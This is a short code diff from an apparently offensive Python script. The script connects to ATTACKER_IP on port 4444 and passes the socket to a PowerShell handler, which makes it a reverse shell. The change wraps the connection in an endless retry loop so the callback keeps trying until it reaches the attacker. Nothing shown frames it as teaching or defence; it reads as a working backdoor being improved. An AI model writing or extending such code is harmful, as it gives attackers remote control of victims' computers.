@@ -54,15 +54,15 @@ def powershell_handler(connection):
             break
 
 def establish_connection():
-    try:
-        caller = socket.socket()
-        print('connected!!')
-        caller.connect((ATTACKER_IP, 4444))
-        print('connected!')
-        powershell_handler(caller)
-    except Exception as e :
-        print(e)
-        time.sleep(5)
+    while True:
+        try:
+            caller = socket.socket()
+            caller.connect((ATTACKER_IP, 4444))
+            print('connected!')
+            powershell_handler(caller)
+        except Exception as e :
+            print(e)
+            time.sleep(5)
 
 
 establish_connection()
